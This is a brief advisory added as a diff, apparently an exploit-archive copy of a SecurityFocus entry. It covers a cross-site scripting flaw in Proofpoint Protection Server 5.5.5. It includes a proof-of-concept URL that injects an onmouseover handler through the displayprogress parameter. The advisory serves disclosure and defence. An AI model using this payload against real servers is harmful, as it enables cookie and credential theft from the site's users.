@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/47687/info
+
+Proofpoint Protection Server is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Proofpoint Protection Server 5.5.5 is vulnerable; other versions may also be affected. 
+
+
+http://www.example.com:10020/enduser/process.cgi?cmd=release&;
+recipient=xxx () yyy com au&
+msg_id=%28MDYzMjU0NTJkYTQ0OWRhYjJlNWY1MjBhNzc5MDEwODlkZGY5OGIzMTc1MGI=%29&
+locale=enus&x=580&y=470&displayprogress=t%22%20
+onmouseover=%22alert%281%29%22%20name=%22frame_display%22%20id=%22
+frame_display%22%20NORESIZE%20SCROLLING=%22no%22%20/%3E%3C!--
